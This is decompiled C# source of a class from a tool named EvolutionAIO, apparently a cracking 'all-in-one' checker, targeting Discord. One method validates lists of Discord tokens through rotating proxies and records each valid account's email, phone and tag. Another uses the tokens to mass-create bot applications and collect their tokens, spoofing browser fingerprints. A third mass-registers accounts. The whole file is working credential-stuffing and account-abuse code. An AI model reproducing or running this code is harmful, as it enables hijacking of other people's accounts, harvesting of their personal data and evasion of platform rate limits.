// Decompiled with JetBrains decompiler
// Type: EvolutionAIO.Checkers.Discord
// Assembly: EvolutionAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FFBD76CC-A7A1-4682-B132-DAECA7C9FD32
// Assembly location: C:\Users\Pc\Downloads\Evolutionv2\EvolutionAIO.exe

using Leaf.xNet;
using System;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

namespace EvolutionAIO.Checkers
{
  internal class Discord
  {
    public static bool check(string[] s, string proxy)
    {
      if (0 >= Config.config.retries + 1)
        return false;
      while (true)
      {
        try
        {
          using (HttpRequest httpRequest = new HttpRequest())
          {
            proxy = Menu.proxies.ElementAt<string>(new Random().Next(Menu.proxiesCount));
            if (Menu.proxyProtocol == "HTTP")
              httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
            if (Menu.proxyProtocol == "SOCKS4")
              httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
            if (Menu.proxyProtocol == "SOCKS5")
              httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
            httpRequest.IgnoreProtocolErrors = true;
            httpRequest.AddHeader("Authorization", s[0]);
            httpRequest.AddHeader("Content-Type", "application/json");
            httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
            HttpResponse httpResponse = httpRequest.Get("https://discordapp.com/api/v6/users/@me");
            if (httpResponse.ToString().Contains("username"))
            {
              foreach (Cookie cookie in httpRequest.Cookies.GetCookies("https://discordapp.com/api/v6/users/@me"))
              {
                if (cookie.Name == "__cfduid")
                {
                  string str = cookie.Value;
                }
              }
              string str1 = Menu.Parse(httpResponse.ToString(), "username\": \"", "\"");
              string str2 = Menu.Parse(httpResponse.ToString(), "id\": \"", "\"");
              string str3 = Menu.Parse(httpResponse.ToString(), "discriminator\": \"", "\"");
              string str4 = Menu.Parse(httpResponse.ToString(), "phone\": \"", "\"");
              string str5 = Menu.Parse(httpResponse.ToString(), "verified\": ", ",");
              string str6 = Menu.Parse(httpResponse.ToString(), "email\": \"", "\"");
              if (str3 == "0001" || str3 == "0002" || (str3 == "6969" || str3 == "9999") || (str3 == "1337" || str3 == "1111" || (str3 == "0999" || str3 == "0666")) || str3 == "6969")
              {
                ++Menu.hits;
                if (Menu.p1 == "2")
                  Colorful.Console.WriteLine(" [+] " + s[0] + " | Tag: " + str1 + "#" + str3, Color.SpringGreen);
                Save.AsResult(nameof (Discord), "Hits", s[0]);
                Save.AsResult(nameof (Discord), "Capture", s[0] + " | Username: " + str1 + " ~ ID: " + str2 + " ~ Discrim: " + str3 + " ~ Phone: " + str4 + " ~ Verified: " + str5 + " ~ Email: " + str6);
                return false;
              }
              ++Menu.frees;
              if (Menu.p1 == "2")
                Colorful.Console.WriteLine(" [/] " + s[0], Color.Yellow);
              Save.AsResult(nameof (Discord), "Frees", s[0]);
              Save.AsResult(nameof (Discord), "Free Capture", s[0] + " | Username: " + str1 + " ~ ID: " + str2 + " ~ Discrim: " + str3 + " ~ Phone: " + str4 + " ~ Verified: " + str5 + " ~ Email: " + str6);
              return false;
            }
            if (httpResponse.ToString().Contains("{\"message\": \"401: Unauthorized\", \"code\": 0}"))
              return false;
          }
        }
        catch (Exception ex)
        {
          if (ex.ToString().Contains("Index was outside the bounds of the array"))
            return false;
          ++Menu.errors;
        }
      }
    }

    public static bool BotTagGen(string[] s, string proxy)
    {
      if (0 >= Config.config.retries + 1)
        return false;
label_1:
      while (true)
      {
        try
        {
          using (HttpRequest httpRequest = new HttpRequest())
          {
            proxy = Menu.proxies.ElementAt<string>(new Random().Next(Menu.proxiesCount));
            if (Menu.proxyProtocol == "HTTP")
              httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
            if (Menu.proxyProtocol == "SOCKS4")
              httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
            if (Menu.proxyProtocol == "SOCKS5")
              httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
            httpRequest.IgnoreProtocolErrors = true;
            while (true)
            {
              string str1 = string.Format("{{\"name\":\"AnimeSexy{0}\",\"team_id\":null}}", (object) new Random().Next(0, 9999));
              httpRequest.AddHeader("accept", "*/*");
              httpRequest.AddHeader("accept-encoding", "gzip, deflate, br");
              httpRequest.AddHeader("accept-language", "en-US,en;q=0.9");
              httpRequest.AddHeader("authorization", s[0]);
              httpRequest.AddHeader("content-length", str1.Length.ToString());
              httpRequest.AddHeader("content-type", "application/json");
              httpRequest.AddHeader("cookie", "__cfduid=db310e9e2c0c25629acdc200ffc56dca71611610285; locale=en-US");
              httpRequest.AddHeader("origin", "https://discord.com");
              httpRequest.AddHeader("referer", "https://discord.com/developers/applications");
              httpRequest.AddHeader("sec-fetch-dest", "empty");
              httpRequest.AddHeader("sec-fetch-mode", "cors");
              httpRequest.AddHeader("sec-fetch-site", "same-origin");
              httpRequest.AddHeader("sec-gpc", "1");
              httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36");
              httpRequest.AddHeader("x-fingerprint", "803389459046596618.jgfYDHl0mRMM9ehYjRqNenw4F8E");
              httpRequest.AddHeader("x-track", "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzg4LjAuNDMyNC45NiBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiODguMC40MzI0Ljk2Iiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjk5OTksImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9");
              HttpResponse httpResponse1 = httpRequest.Post("https://discord.com/api/v8/applications", str1, "application/json");
              Save.AsResult(nameof (Discord), "R", httpResponse1.ToString());
              if (!httpResponse1.ToString().Contains("401: Unauthorized") && !httpResponse1.ToString().Contains("400: Bad Request"))
              {
                if (httpResponse1.ToString().Contains("  \"message\": \"You are being rate limited.\", ") || httpResponse1.ToString().Contains(" rate limited"))
                {
                  int int32 = Convert.ToInt32(Menu.Parse(httpResponse1.ToString(), "retry_after\": ", "."));
                  Save.AsResult(nameof (Discord), "TS", string.Format("Thread.Sleep({0});", (object) (int32 * 1000)));
                  Thread.Sleep(int32 * 1000);
                }
                if (httpResponse1.ToString().Contains("discriminator\": \""))
                {
                  string str2 = Menu.Parse(httpResponse1.ToString(), "{\"id\": \"", "\", \"name\"");
                  Save.AsResult(nameof (Discord), "RWork", httpResponse1.ToString());
                  httpRequest.ClearAllHeaders();
                  httpRequest.AddHeader("accept", "*/*");
                  httpRequest.AddHeader("authorization", s[0]);
                  httpRequest.AddHeader("content-length", "2");
                  httpRequest.AddHeader("content-type", "application/json");
                  httpRequest.AddHeader("origin", "https://discord.com");
                  httpRequest.AddHeader("referer", "https://discord.com/developers/applications");
                  httpRequest.AddHeader("sec-fetch-dest", "empty");
                  httpRequest.AddHeader("sec-fetch-mode", "cors");
                  httpRequest.AddHeader("sec-fetch-site", "same-origin");
                  httpRequest.AddHeader("sec-gpc", "1");
                  httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36");
                  HttpResponse httpResponse2 = httpRequest.Post("https://discord.com/api/v8/applications/" + str2 + "/bot", "{}", "application/json");
                  Save.AsResult(nameof (Discord), "R1", httpResponse2.ToString());
                  string str3 = Menu.Parse(httpResponse2.ToString(), "token\": \"", "\"");
                  string str4 = Menu.Parse(httpResponse2.ToString(), "username\": \"", "\"");
                  string str5 = Menu.Parse(httpResponse2.ToString(), "discriminator\": \"", "\"");
                  if (str5 == "0001" || str5 == "6969" || (str5 == "9999" || str5 == "1337") || (str5 == "1111" || str5 == "0999" || (str5 == "0666" || str5 == "6969")))
                  {
                    ++Menu.hits;
                    if (Menu.p1 == "2")
                      Colorful.Console.WriteLine(" [+] " + s[0] + " | Tag: " + str4 + "#" + str5, Color.SpringGreen);
                    Save.AsResult(nameof (Discord), "Hits", s[0]);
                    Save.AsResult(nameof (Discord), "Capture", s[0] + " | Username: " + str4 + " ~ Token: " + str3 + " ~ Discrim: " + str5);
                  }
                  else
                  {
                    ++Menu.frees;
                    if (Menu.p1 == "2")
                      Colorful.Console.WriteLine(" [/] " + s[0], Color.Yellow);
                    Save.AsResult(nameof (Discord), "Frees", s[0]);
                    Save.AsResult(nameof (Discord), "Free Capture", s[0] + " | Username: " + str4 + " ~ Token: " + str3 + " ~ Discrim: " + str5);
                  }
                }
                else
                  goto label_1;
              }
              else
                break;
            }
            return false;
          }
        }
        catch (Exception ex)
        {
          if (ex.ToString().Contains("Index was outside the bounds of the array"))
            return false;
          Save.AsResult(nameof (Discord), "Errors", ex.ToString());
          ++Menu.errors;
        }
      }
    }

    public static bool Registerer(string[] s, string proxy)
    {
      if (0 >= Config.config.retries + 1)
        return false;
      while (true)
      {
        try
        {
          using (HttpRequest httpRequest = new HttpRequest())
          {
            proxy = Menu.proxies.ElementAt<string>(new Random().Next(Menu.proxiesCount));
            if (Menu.proxyProtocol == "HTTP")
              httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
            if (Menu.proxyProtocol == "SOCKS4")
              httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
            if (Menu.proxyProtocol == "SOCKS5")
              httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
            httpRequest.IgnoreProtocolErrors = true;
            string str = "{\"fingerprint\":\"803481935749447701.35Qztot3LXBonJDHRNtbYdoXplY\",\"email\":\"" + s[0] + "\",\"username\":\"AnimeTester\",\"password\":\"" + s[1] + "\",\"invite\":null,\"consent\":true,\"date_of_birth\":\"1999-08-15\",\"gift_code_sku_id\":null,\"captcha_key\":null}";
            httpRequest.AddHeader("accept", "*/*");
            httpRequest.AddHeader("content-length", str.Length.ToString());
            httpRequest.AddHeader("content-type", "application/json");
            httpRequest.AddHeader("origin", "https://discord.gg");
            httpRequest.AddHeader("referer", "https://discord.gg/");
            httpRequest.AddHeader("sec-fetch-dest", "empty");
            httpRequest.AddHeader("sec-fetch-mode", "cors");
            httpRequest.AddHeader("sec-fetch-site", "same-origin");
            httpRequest.AddHeader("sec-gpc", "1");
            httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36");
            HttpResponse httpResponse = httpRequest.Post("https://discord.com/api/v8/auth/register", str, "application/json");
            Save.AsResult(nameof (Discord), "R", httpResponse.ToString());
            if (httpResponse.ToString().Contains("EMAIL_ALREADY_REGISTERED") || httpResponse.ToString().Contains("PASSWORD_BAD_PASSWORD"))
              return false;
            httpResponse.ToString().Contains("");
          }
        }
        catch (Exception ex)
        {
          if (ex.ToString().Contains("Index was outside the bounds of the array"))
            return false;
          Save.AsResult(nameof (Discord), "Errors", ex.ToString());
          ++Menu.errors;
        }
      }
    }
  }
}
